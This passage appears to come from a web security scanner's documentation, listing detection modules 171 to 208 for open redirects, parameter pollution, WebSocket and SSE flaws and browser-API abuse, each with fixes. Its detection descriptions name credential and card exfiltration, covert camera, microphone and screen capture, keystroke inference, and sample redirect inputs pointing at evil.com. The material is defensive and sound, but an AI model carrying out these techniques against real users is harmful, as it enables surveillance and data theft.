- Treat Network Information API data as sensitive — never send connection attributes to third-party analytics
- If adaptive loading is needed, make security-relevant features (CSP, anti-CSRF) invariant across connection types
- Avoid storing connection type in server-side session data — it constitutes unnecessary personal data collection
- Review third-party script integrations that might automatically capture navigator.connection properties
- Test security controls on simulated slow connections in DevTools — verify they are not stripped in 'lite' mode

**References:** [↗](https://wicg.github.io/netinfo/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Network_Information_API)

---

## Injection (Other)

*9 scanners in this category.*

### 171. Link Injection / Header Injection (Passive)
**Module:** `link_injection_passive` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-116** &nbsp;|&nbsp; **MITRE:** T1190

Detects link injection indicators: href attributes built from URL parameters (XSS via javascript: URLs, phishing via external URLs), document.write() with URL parameters (writes attacker HTML, bypasses innerHTML filters), response headers (Location, Refresh, Link) containing URL parameters (CRLF injection enables response splitting and arbitrary header injection), window.location set from URL parameters (open redirect), and <base href> pointing to external domains (all relative links hijacked).

**How to fix:**
- Never use URL parameters directly in href, src, or Location header values without validation
- Validate redirect destinations against an allowlist of permitted domains
- Strip CRLF characters from all header values constructed from user input
- Avoid document.write() entirely; use safe DOM methods (textContent, createElement)

**References:** [↗](https://owasp.org/www-community/attacks/HTTP_Response_Splitting) · [↗](https://cwe.mitre.org/data/definitions/116.html)

---

### 172. Open Redirect
**Module:** `open_redirect` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-601**

Phishing attacks using your trusted domain as a redirect gateway OAuth token theft when redirect_uri points to an open redirect on the resource server SSRF chain: open redirect to internal metadata endpoint

**How to fix:**
- Validate redirect URLs against a server-side allowlist of permitted destinations
- For OAuth: perform exact string matching on redirect_uri — no prefix matching
- Show a warning interstitial for any external redirect

---

### 173. Open Redirect (Deep Check)
**Module:** `open_redirect_deep` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-601**

Open redirect used in phishing chains to borrow trust from the victim domain Meta-refresh and JS location.href redirects not caught by basic header checks Redirect parameters (next, return_to, url, redirect_uri) vulnerable to bypass via encoding

**How to fix:**
- Validate redirect destinations against a server-side allowlist of trusted URLs
- Reject any redirect target not on the allowlist; never reflect user-supplied URLs
- Audit all meta-refresh and JS redirect patterns alongside header-based redirects

---

### 174. Client-Side Open Redirect (JavaScript)
**Module:** `client_side_redirect` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-601**

location.href from URLSearchParams: attacker crafts ?next=https://evil.com to redirect users location.href = location.hash.slice(1): attacker controls URL fragment, redirecting via #https://evil.com location = document.referrer: attacker controls Referer header from a link on their page postMessage-triggered redirect: any cross-origin page can send a redirect target via postMessage Meta refresh to external URL: HTML injection that redirects users without server involvement

**How to fix:**
- Validate all redirect targets against an explicit allow-list of trusted origins before assigning to location
- Parse redirect URLs with the URL API and compare only the hostname property
- Never use document.referrer, location.hash, or postMessage data as redirect targets without validation
- Add event.origin checks to all postMessage listeners before processing navigation messages
- Replace meta http-equiv='refresh' with server-side redirects for better control

---

### 175. Integer Overflow / Underflow in Financial Calculations
**Module:** `integer_overflow_passive` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-190** &nbsp;|&nbsp; **MITRE:** T1190

Detects integer arithmetic vulnerabilities in financial or quantity calculations: price × parseInt(req.body) without bounds check (attacker sends negative quantity; total price becomes negative; credit issued to attacker), balance -= parseInt(req.body.amount) without validation (negative withdrawal adds to balance), parseInt(searchParams) without min/max range validation (overflow/underflow in downstream calculations), price×quantity without Math.abs (signed arithmetic; negative values produce credit instead of debit), and large integer constants near Number.MAX_SAFE_INTEGER (precision loss above 2^53; integer identity checks fail).

**How to fix:**
- Validate all numeric inputs with explicit minimum/maximum bounds before arithmetic
- Use Math.abs() or reject negative values for quantity/amount fields
- Use BigInt or a decimal arithmetic library for financial calculations to avoid precision loss
- Apply server-side range validation independent of client-side constraints
- Reject out-of-range values with 400 Bad Request before any calculation

**References:** [↗](https://cwe.mitre.org/data/definitions/190.html) · [↗](https://owasp.org/www-project-top-ten/)

---

### 176. HTTP Parameter Pollution
**Module:** `parameter_pollution` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-235**

Duplicate parameters processed differently by app and WAF layers — bypasses input validation Array-style parameters (?id[]=A&id[]=B) exploit framework-specific parsing quirks Parameter pollution used to bypass CSRF token checks by polluting the token parameter

**How to fix:**
- Define explicit behavior for duplicate parameters: reject duplicates or use first/last only
- Apply input validation at the application layer, not solely at the WAF
- Log and alert on duplicate parameter submissions as a WAF evasion signal

---

### 177. HTTP Parameter Pollution (Passive)
**Module:** `parameter_pollution_passive` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-235** &nbsp;|&nbsp; **MITRE:** T1190

Detects HTTP Parameter Pollution (HPP) indicators: code taking only [0] from multi-value parameters (front-end checks first value, back-end uses second — attacker's malicious second value bypasses WAF/validation), PHP double-bracket superglobal access, _method/X-HTTP-Method-Override parameter tunneling (WAF sees GET but back-end processes DELETE/PUT), and backend parameter splitting on delimiters enabling additional injected key-value pairs.

**How to fix:**
- Validate all occurrences of a parameter, not just the first or last
- Reject requests with duplicate parameter names unless explicitly supported
- Disable _method and X-HTTP-Method-Override support if not needed; validate against allowlist if enabled
- Sanitize parameter values to remove delimiter characters before splitting

**References:** [↗](https://owasp.org/www-project-web-security-testing-guide/) · [↗](https://cwe.mitre.org/data/definitions/235.html)

---

### 178. Log Injection
**Module:** `log_injection_passive` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-117**

CRLF injection into logs (\r\n) allows forging fake log entries and hiding attacker activity X-Log-Injected header reflected in response confirms server-side log injection point Log injection used to cover tracks or inject false audit entries during an incident

**How to fix:**
- Sanitize all log inputs: strip or encode \r, \n, and other control characters
- Use structured logging (JSON) to eliminate free-text log injection as an attack surface
- Never echo user-supplied input directly into log messages

---

### 179. Relative Path Overwrite (RPO) Vulnerability
**Module:** `relative_path_overwrite` &nbsp;|&nbsp; **Severity:** 🟡 MEDIUM
**CWE-116**

Browser resolves relative CSS/JS from wrong base URL on ambiguous paths (no trailing slash) Attacker requests /page/../../injected which resolves relative CSS from /page/injected/ If injected path serves reflected user input as HTML, browser parses it as CSS Injected CSS can exfiltrate CSRF tokens via attribute selectors without JavaScript Missing X-Content-Type-Options: nosniff amplifies RPO by allowing content sniffing

**How to fix:**
- Use root-relative (/styles.css) or absolute URLs for all stylesheet and script references
- Ensure URLs consistently use trailing slashes for directory resources (301 redirect)
- Add X-Content-Type-Options: nosniff to all responses to prevent content type sniffing
- Validate all URL routing so path traversal variants return 404 rather than the same content
- Avoid including user-controlled content in responses served from ambiguous path URLs

---

## WebSockets & Real-Time

*8 scanners in this category.*

### 180. WebSocket Security Weakness
**Module:** `websocket_security_deep` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-346**

WebSocket over ws:// (plaintext) allows network-level eavesdropping and message injection Auth token in WebSocket URL (ws://...?token=...) logged in proxy and access logs Socket.io/sockjs endpoints without Origin validation accept cross-site WebSocket hijacking

**How to fix:**
- Use wss:// (WebSocket over TLS) exclusively — reject ws:// connections
- Authenticate WebSocket connections via cookie or signed handshake, not URL query parameters
- Validate Origin header against an allowlist during the WebSocket handshake

---

### 181. Eventsource Security
**Module:** `eventsource_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-918**

EventSource (SSE) misuse — SSE URL sourced from URL parameter enables SSRF via SSE connection, external SSE URL connected without verification, SSE message data containing auth/token relayed to external endpoint.

**How to fix:**
- Hardcode EventSource URLs — never derive from URL parameters or user input
- Validate and allowlist EventSource endpoint URLs
- Do not relay SSE message data containing auth/credentials to external endpoints
- Implement CSP connect-src to restrict EventSource connection destinations

**References:** [↗](https://html.spec.whatwg.org/multipage/server-sent-events.html) · [↗](https://cwe.mitre.org/data/definitions/918.html)

---

### 182. SSE Stream Security Misconfiguration
**Module:** `server_sent_events_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-284**

CORS wildcard on SSE endpoint: any origin subscribes to real-time data stream, receives PII or private events Unauthenticated SSE stream: attacker accesses event feed without credentials, receives private notifications Sensitive data in SSE events: tokens, emails, session IDs broadcast in plaintext event stream Cacheable SSE stream: proxy caches event replay, delivering stale private data to wrong users Missing auth check on /events: server push channel bypasses application access controls

**How to fix:**
- Restrict SSE endpoints with the same authentication middleware used for REST API routes
- Set specific CORS origins (not *) on event stream endpoints — verify Origin server-side
- Add Cache-Control: no-store, no-cache to all SSE responses to prevent proxy caching
- Never include raw tokens, passwords, or PII in SSE data payloads — use opaque event IDs
- Implement per-user event channels with server-side tenant isolation, not a single broadcast stream

**References:** [↗](https://owasp.org/www-project-api-security/) · [↗](https://html.spec.whatwg.org/multipage/server-sent-events.html)

---

### 183. Webtransport Security
**Module:** `webtransport_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-918**

WebTransport QUIC channel misuse — SSRF via URL param, credential exfiltration over QUIC stream, external endpoint connection, data relay to other transports.

**How to fix:**
- Validate and allowlist WebTransport server URLs — never derive from user-controlled input
- Do not transmit credentials, tokens, or localStorage data over WebTransport streams
- Implement Content-Security-Policy connect-src to restrict WebTransport endpoints
- Audit WebTransport usage for covert relay patterns bridging to WebSocket or fetch

**References:** [↗](https://www.w3.org/TR/webtransport/) · [↗](https://cwe.mitre.org/data/definitions/918.html)

---

### 184. Push API Subscription Exfiltration / Silent Push
**Module:** `push_api_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-284**

Silent push: userVisibleOnly:false attempts covert background push without notification — can exfiltrate data silently Missing VAPID: subscription without applicationServerKey allows any server to send push to the endpoint Subscription endpoint to analytics: push subscription URL is a stable, unique tracking token across sessions Push payload logged: event.data content in console exposes push message content to DevTools sessions Push amplification: push handler that makes outbound fetch requests can be weaponized for network-level DoS

**How to fix:**
- Always set userVisibleOnly:true — never attempt silent push
- Always provide applicationServerKey (VAPID) in pushManager.subscribe() to authenticate your push server
- Never share the push subscription endpoint with third-party analytics or advertising systems
- Remove all console.log/warn/error calls on push payload content in production
- Validate push message origin and content before processing — treat all push payloads as untrusted input

**References:** [↗](https://www.w3.org/TR/push-api/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Push_API)

---

### 185. Broadcast Channel Credential Broadcast
**Module:** `broadcast_channel_advanced_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-319** &nbsp;|&nbsp; **MITRE:** T1040

Detects BroadcastChannel postMessage containing credentials (broadcast to all same-origin tabs), .onmessage relay to remote servers, attacker-controlled channel names from URL parameters, and predictable sensitive channel names (auth/login/token).

**How to fix:**
- Never broadcast password/token/credential values via BroadcastChannel
- Use unpredictable, random channel names for security-sensitive channels
- Do not relay BroadcastChannel messages to remote servers
- Validate BroadcastChannel name inputs — never source from URL parameters

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/Broadcast_Channel_API) · [↗](https://cwe.mitre.org/data/definitions/319.html)

---

### 186. MessageChannel Port Leakage / Cross-Origin Messaging
**Module:** `message_channel_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-346**

Port to wildcard origin: MessageChannel port transferred via postMessage with targetOrigin='*' — any cross-origin page can receive the communication channel Sensitive data via port: auth tokens, passwords, or API keys sent through a MessagePort without verifying the recipient Port to URL-param target: port transferred to a window/worker identified by URL parameter — attacker controls port recipient via link crafting No origin check on port.onmessage: messages processed from any origin without event.origin validation — cross-origin message injection Port serialized to storage: MessagePort object stored in localStorage/sessionStorage — ports cannot be safely serialized, risks data corruption and channel loss

**How to fix:**
- Always specify the exact target origin when calling postMessage to transfer a port — never use '*'
- Validate event.origin in port.onmessage before processing any received message
- Never derive the postMessage target from URL parameters — use hardcoded or server-provided trusted origins
- Do not send credentials or auth tokens through MessageChannel ports without encryption and origin verification
- MessagePort objects cannot be cloned — do not attempt to serialize them to Web Storage

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel) · [↗](https://html.spec.whatwg.org/multipage/web-messaging.html)

---

### 187. MessageChannel / Channel Messaging Security
**Module:** `channel_messaging_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-346**

port.postMessage() sends password/token/secret: sensitive data transmitted over MessageChannel port to potentially untrusted receiver port.onmessage handler passes data to eval()/innerHTML: cross-context message injection enables code execution or DOM injection MessageChannel port data transmitted via fetch/sendBeacon: channel communication data forwarded to external endpoint MessageChannel configuration from URL parameter: attacker-controlled messaging channel parameters

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/MessageChannel) · [↗](https://cwe.mitre.org/data/definitions/346.html)

---

## Browser APIs & Web Platform

*78 scanners in this category.*

### 188. Web Serial API Injection Risk
**Module:** `web_serial_security` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-74**

Serial data from URL params: attacker crafts URL that sends malicious commands to industrial control, medical, or home automation devices No vendor/product filters: all connected serial devices accessible — user may grant access to unintended device (e.g., Arduino vs medical device) Port enumeration fingerprinting: getPorts() reveals USB vendor/product IDs of permitted serial devices No command validation: raw URL parameter data written to serial port can trigger arbitrary device commands Port info transmitted: usbVendorId/usbProductId sent to server identifies user's physical devices

**How to fix:**
- Never write data to serial port derived from URL parameters or user input without strict allowlist validation
- Always specify usbVendorId/usbProductId filters in requestPort() to restrict to intended device type
- Implement a command allowlist — only send predefined, validated commands to serial devices
- Never transmit serial port identification data to server — keep physical device identity client-side
- Log all serial commands for audit — serial device interactions may have physical-world consequences

**References:** [↗](https://wicg.github.io/serial/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Web_Serial_API)

---

### 189. Geolocation Covert Tracking
**Module:** `geolocation_security` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-359** &nbsp;|&nbsp; **MITRE:** T1430

Detects GPS coordinates transmitted without evident consent, continuous location tracking via watchPosition(), geolocation options from URL parameters, and high-accuracy location exfiltration.

**How to fix:**
- Display explicit consent UI before calling getCurrentPosition() or watchPosition()
- Never transmit coordinates to third-party servers without clear user awareness
- Prefer coarse location over high-accuracy (enableHighAccuracy:false) when fine precision is not needed
- Validate geolocation option parameters — never source accuracy/timeout from URL parameters

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 190. Speech Recognition Security
**Module:** `speech_recognition_security` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-359**

Speech Recognition API misuse — microphone auto-activated on page load without user gesture, audio transcripts transmitted to remote (audio surveillance), continuous recognition mode enables extended microphone capture.

**How to fix:**
- Only call SpeechRecognition.start() in response to explicit user actions, never on page load
- Do not transmit speech transcripts to remote analytics or third-party servers
- Avoid continuous recognition mode for features that don't require it
- Disclose microphone usage clearly to users before activation

**References:** [↗](https://w3c.github.io/speech-api/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 191. Media Recorder Security
**Module:** `media_recorder_security` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-359**

MediaRecorder API misuse — recording auto-started on page load without explicit user action, recorded audio/video Blob transmitted to remote server, continuous chunked upload via timeslice enables real-time media streaming surveillance.

**How to fix:**
- Only start MediaRecorder in response to explicit user gestures — never on DOMContentLoaded/pageshow
- Do not transmit recorded Blob data to remote servers without explicit user consent
- Avoid timeslice-based continuous chunked uploads to external endpoints
- Implement clear visual recording indicators whenever MediaRecorder is active

**References:** [↗](https://www.w3.org/TR/mediastream-recording/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 192. Camera / Microphone Covert Capture
**Module:** `media_devices_security` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-359** &nbsp;|&nbsp; **MITRE:** T1125

Detects getUserMedia() stream transmitted via WebRTC/WebSocket (covert camera/microphone capture), enumerateDevices() hardware fingerprinting, attacker-controlled capture constraints from URL parameters, and MediaStreamTrack device identifier exfiltration.

**How to fix:**
- Never transmit getUserMedia() streams to unintended third-party endpoints
- Display clear visible UI indicator (camera/mic icon) when capturing is active
- Do not transmit enumerateDevices() device list to analytics without user consent
- Validate getUserMedia() constraints — never source from URL parameters

**References:** [↗](https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 193. Payment Request API Security Risk
**Module:** `payment_request_security` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-319**

Payment Request over HTTP: payment data visible to MITM; Payment Request API explicitly requires HTTPS basic-card method exposes raw card numbers: page JavaScript receives PAN, CVV, expiry — PCI DSS scope expansion paymentResponse logged to console: billing address, card details exposed in DevTools to any page script No HSTS on payment page: SSL stripping on first visit blocks Payment Request or downgrades to HTTP Card number in JavaScript: storing or logging card numbers in JS violates PCI DSS requirements 3.2 and 6.4

**How to fix:**
- Require HTTPS on all payment pages and enforce with HSTS (max-age ≥ 31536000, includeSubDomains)
- Never use 'basic-card' — use payment service provider-specific methods (Stripe, PayPal, Google Pay) to avoid receiving raw card data
- Never log paymentResponse or any card data to console.log — remove all payment-related debug logging before production
- Implement Content Security Policy to prevent exfiltration of payment data via XSS
- Ensure PCI DSS SAQ A-EP or higher compliance if JavaScript interacts with any payment form elements

**References:** [↗](https://www.w3.org/TR/payment-request/) · [↗](https://www.pcisecuritystandards.org/)

---

### 194. Payment Handler Security
**Module:** `payment_handler_security` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-359**

Payment Handler API misuse — excessive PII delegation (name/email/phone/shipping), payment instrument key/details exfiltrated, card number/CVV harvested in payment event handler.

**How to fix:**
- Only delegate payment fields (payerName/payerEmail/etc.) that are strictly necessary
- Do not transmit instrumentKey or payment instrument details to analytics endpoints
- Never access or store cardNumber, CVV, or PIN from within Payment Handler event listeners
- Implement strict CSP and SRI to prevent payment handler script tampering

**References:** [↗](https://w3c.github.io/payment-handler/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 195. Payment Page Security / PCI DSS Gap
**Module:** `payment_page_security` &nbsp;|&nbsp; **Severity:** 🔴 CRITICAL
**CWE-829**

Checkout page without CSP is vulnerable to Magecart-style script injection stealing card numbers Inline scripts on payment pages bypass Content-Security-Policy and enable stored XSS skimming Unknown or unverified payment iframes are a supply-chain risk — one compromised provider = card theft at scale HTTP checkout page violates PCI DSS requirement 4.2.1 — cardholder data transmitted in plaintext

**How to fix:**
- Implement strict CSP on all payment pages: no unsafe-inline, script-src allowlist only (PCI DSS 6.4.3)
- Move all inline scripts to external files; use nonce-based CSP for any required inline scripts
- Verify all payment iframes come from PCI-compliant providers; add them to CSP frame-src allowlist
- Enforce HTTPS with HSTS on all checkout and payment paths; redirect all HTTP to HTTPS

---

### 196. WebUSB Unauthorized Device Access
**Module:** `web_usb_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-284**

Empty device filters: all connected USB devices shown in picker; user grants access to unintended device Device serial number access: USB serial numbers uniquely identify physical hardware across sessions for persistent fingerprinting Hardware fingerprint transmitted: vendorId/productId/serialNumber sent to server — physical device identity disclosed Firmware write via WebUSB: malicious page can permanently alter device firmware if user is tricked into granting access All paired devices enumeration: previously permitted USB devices revealed without user action, listing entire USB hardware inventory

**How to fix:**
- Always specify vendor and product ID filters in requestDevice() to restrict to intended device type
- Never transmit USB device serial numbers or identifiers to server — only transmit application-relevant data
- Implement device attestation before writing to any device — verify device identity and firmware signature
- Display clear UI showing which device the user is granting access to and for what purpose
- Never use WebUSB for firmware updates unless device authenticates itself with a signed challenge

**References:** [↗](https://wicg.github.io/webusb/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/WebUSB_API)

---

### 197. Web Bluetooth Device Fingerprinting/PHI
**Module:** `web_bluetooth_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

acceptAllDevices: all nearby Bluetooth devices visible — user may pair unintended device enabling cross-device attacks Paired device enumeration: getDevices() reveals user's Bluetooth hardware inventory for fingerprinting Health GATT data (PHI): heart rate/blood pressure/thermometer data from medical devices constitutes health information requiring HIPAA compliance Device name transmitted: Bluetooth device names (often containing personal info) sent to server for tracking Advertisement scanning: watchAdvertisements() passively tracks nearby Bluetooth devices — location correlation attack

**How to fix:**
- Always use specific optionalServices and service filters — never use acceptAllDevices: true
- Never send Bluetooth device.name, device.id, or GATT characteristic data to analytics services
- Obtain explicit HIPAA-compliant consent before reading health GATT characteristics
- Stop advertisement watching immediately after discovering the target device
- Validate GATT characteristic data server-side — Bluetooth data can be spoofed by malicious devices

**References:** [↗](https://webbluetoothcg.github.io/web-bluetooth/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Web_Bluetooth_API)

---

### 198. Web NFC Contactless Exfiltration
**Module:** `web_nfc_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-284**

Auto-scan on load: page starts scanning NFC tags without user gesture — silently reads contactless payment cards in range Write from URL param: attacker crafts URL to inject arbitrary NFC payload written to nearby tags Contactless data exfiltration: NDEF record data (URLs, text, MIME) from scanned tags transmitted to attacker server Sensitive types in NFC records: auth tokens or payment card data written to or read from NFC tags Missing permission denial: uncaught NotAllowedError leads to silent failure and possible fallback to insecure path

**How to fix:**
- Only initiate NDEFReader.scan() within a trusted user gesture handler — never on page load or automatically
- Never derive NFC write payloads from URL parameters — hardcode payload from server-side allowlist
- Validate and sanitize all NDEF records before processing — reject unexpected record types
- Do not transmit raw NFC record data to remote endpoints — process locally and store only necessary fields
- Always handle NotAllowedError and AbortError in NFC permission flows

**References:** [↗](https://w3c.github.io/web-nfc/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Web_NFC_API)

---

### 199. WebHID Device Injection / Input Exfiltration
**Module:** `hid_api_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-74**

Empty device filters: requestDevice({filters:[]}) allows selecting any connected HID device — keyboard, gamepad, security key Device enumeration: getDevices() returns all previously granted HID devices — fingerprinting and unauthorized reuse HID write from URL param: attacker-controlled URL injects arbitrary HID reports — potential keyboard emulation or firmware commands Device info exfiltration: productId and vendorId reveal exact hardware model — precise device fingerprinting Input report capture: raw HID input reports from keyboards or biometric readers transmitted to server

**How to fix:**
- Always specify productId and vendorId in HID device filters — never use empty filter arrays
- Cache the HIDDevice reference securely rather than re-enumerating with getDevices() on every page load
- Never derive HID report payloads from URL parameters — validate all HID output against strict allowlists
- Do not transmit HID device identifiers or input reports to remote servers without explicit user consent
- Restrict WebHID via Permissions Policy header — block it from all third-party origins

**References:** [↗](https://wicg.github.io/webhid/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/WebHID_API)

---

### 200. Web MIDI SysEx Injection / Device Fingerprinting
**Module:** `midi_api_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-74**

SysEx firmware injection: sysex:true allows sending arbitrary System Exclusive commands to synthesizers, samplers, and hardware that may accept firmware updates SysEx from URL param: attacker crafts URL that sends malicious MIDI SysEx bytes to connected hardware Device enumeration fingerprinting: all MIDI inputs and outputs enumerated for a unique hardware fingerprint Device name to analytics: manufacturer/product name reveals connected music hardware — user profiling MIDI message replay attacks: captured MIDI data replayed to automate hardware actions without user presence

**How to fix:**
- Never request sysex:true unless absolutely necessary — review all System Exclusive message patterns
- Never derive MIDI send() payloads from URL parameters — validate all MIDI output data against an allowlist
- Limit MIDI device enumeration to the minimum scope required for the feature
- Do not transmit MIDI device names, manufacturer strings, or identifiers to analytics
- Implement rate limiting on MIDI output to prevent hardware DoS via message flooding

**References:** [↗](https://webaudio.github.io/web-midi-api/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Web_MIDI_API)

---

### 201. WebHID API Security
**Module:** `web_hid_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

hid.getDevices() auto-connect on page load: silent re-connection to previously granted HID devices without user gesture HID input report data exfiltrated: raw hardware device input stream transmitted to attacker-controlled endpoint requestDevice() filter from URL parameter: attacker-controlled vendorId/productId targeting specific HID devices HID input report keystroke inference: keyboard HID reports decoded to reconstruct user keystrokes

**References:** [↗](https://wicg.github.io/webhid/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 202. Gamepad Security
**Module:** `gamepad_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

Gamepad API misuse — getGamepads() input state transmitted to remote (controller surveillance), continuous button/axes polling via rAF, GamepadEvent id/mapping exfiltrated for fingerprinting, gamepad state correlated with keyboard/password inputs.

**How to fix:**
- Do not transmit getGamepads() output to remote analytics or tracking endpoints
- Avoid continuous rAF polling of gamepad state that ships data to external servers
- Do not use GamepadEvent device identifiers for browser fingerprinting
- Audit any code correlating gamepad input with credential/password fields

**References:** [↗](https://w3c.github.io/gamepad/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 203. Geolocation Privacy/Tracking Risk
**Module:** `geolocation_api_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

Location shared with analytics: precise GPS coordinates sent to third-party analytics violates GDPR without explicit consent watchPosition without clearWatch: continuous GPS tracking runs indefinitely, draining battery and recording all user movements enableHighAccuracy: GPS-level precision requested when city-level (IP geolocation) suffices — maximizes privacy intrusion Location transmitted without consent UI: coordinates collected before user acknowledges what location is used for High-accuracy location fingerprint: combines device movement patterns with other fingerprinting data for persistent tracking

**How to fix:**
- Request geolocation only in direct response to user action (e.g., 'Find near me' button click)
- Show explicit consent notice before calling getCurrentPosition() explaining the purpose and data retention
- Use enableHighAccuracy:false for non-navigation use cases — city-level accuracy is sufficient for most features
- Always call clearWatch() when location tracking is no longer needed — tie to component unmount or feature deactivation
- Never send raw GPS coordinates to third-party analytics — use coarsened or anonymized location where possible

**References:** [↗](https://w3c.github.io/geolocation-api/) · [↗](https://gdpr.eu/article-9-processing-special-categories-of-personal-data/)

---

### 204. Device Motion Keylogging / Fingerprinting
**Module:** `device_motion_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-200**

Keylogging via motion: vibration micro-patterns from keypresses can be matched to keystrokes with ML classifiers Inertial navigation: accelerometer integration can reconstruct walking route and physical location without GPS permission Motion fingerprinting: gyroscope/accelerometer bias is unique per device — enables cross-site device tracking Analytics sharing: acceleration and rotation data piped to third-party analytics enables passive profiling Missing iOS requestPermission: devicemotion events are silently blocked on iOS 13+ without DeviceMotionEvent.requestPermission()

**How to fix:**
- Always call DeviceMotionEvent.requestPermission() on iOS 13+ before subscribing to devicemotion events
- Avoid correlating devicemotion events with keyboard or input events — remove this logic entirely
- Do not transmit raw acceleration or rotation data to analytics endpoints — aggregate and anonymize
- Declare the 'accelerometer' and 'gyroscope' permissions policy in response headers
- Sample at the lowest acceptable frequency and quantize values to limit fingerprinting precision

**References:** [↗](https://www.w3.org/TR/device-orientation/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Device_orientation_events)

---

### 205. Proximity Sensor Security
**Module:** `proximity_sensor_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

Proximity Sensor API misuse — ProximitySensor near/distance readings exfiltrated to remote, sensor data correlated with auth/payment/login events (physical activity inference), continuous proximity polling with data upload.

**How to fix:**
- Do not transmit ProximitySensor readings to remote endpoints or analytics
- Never correlate proximity sensor state with authentication or payment events
- Avoid continuous sensor polling that uploads data to external servers
- Require explicit user consent before activating proximity sensor features

**References:** [↗](https://w3c.github.io/proximity/) · [↗](https://cwe.mitre.org/data/definitions/359.html)

---

### 206. Screen Capture Consent/Leakage Risk
**Module:** `screen_capture_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

Auto-start getDisplayMedia: page begins capturing screen without explicit user gesture — unauthorized screen recording Full monitor capture: displaySurface:'monitor' captures all open applications, exposing passwords, banking, personal communications Screenshot transmitted to server: canvas.toDataURL() screen content sent to server — mass data exfiltration MediaRecorder + screen capture: screen session recorded and potentially transmitted without clear recording indicator Screen stream via WebSocket: real-time screen content streamed to server — continuous surveillance pattern

**How to fix:**
- Only call getDisplayMedia() in direct response to a user gesture (button click) — never on page load
- Show a persistent, unmissable recording indicator (blinking red dot) whenever screen capture is active
- Prefer displaySurface:'browser' to restrict capture to browser tab, not entire screen
- Never automatically transmit screen capture data — require explicit user 'share' confirmation before sending
- Implement Content Security Policy to restrict where captured screen data can be sent

**References:** [↗](https://w3c.github.io/mediacapture-screen-share/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Screen_Capture_API)

---

### 207. Contact Picker Mass PII Exfiltration
**Module:** `contact_picker_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

Mass contact grab: requesting name+email+tel+address in one call harvests complete phonebook contact records multiple:true full phonebook: all contacts selected at once enables complete addressbook exfiltration Contact data to server: email addresses, phone numbers, and physical addresses uploaded to remote endpoint Analytics PII leakage: contact email/tel shared with third-party analytics for cross-site identity matching Insecure local storage: contact data persisted in localStorage is XSS-accessible — entire addressbook at risk

**How to fix:**
- Request only the minimum necessary contact properties for the specific feature being implemented
- Avoid multiple:true unless the user explicitly needs to select multiple contacts for a specific task
- Never transmit contact data to analytics or advertising endpoints — this is third-party PII sharing
- Do not persist contact data in localStorage or sessionStorage — process and discard after use
- Present clear disclosure to users about which contact fields are collected and why

**References:** [↗](https://wicg.github.io/contact-api/spec/) · [↗](https://developer.mozilla.org/en-US/docs/Web/API/Contact_Picker_API)

---

### 208. Clipboard Snooping / Poisoning
**Module:** `clipboard_api_security` &nbsp;|&nbsp; **Severity:** 🟠 HIGH
**CWE-359**

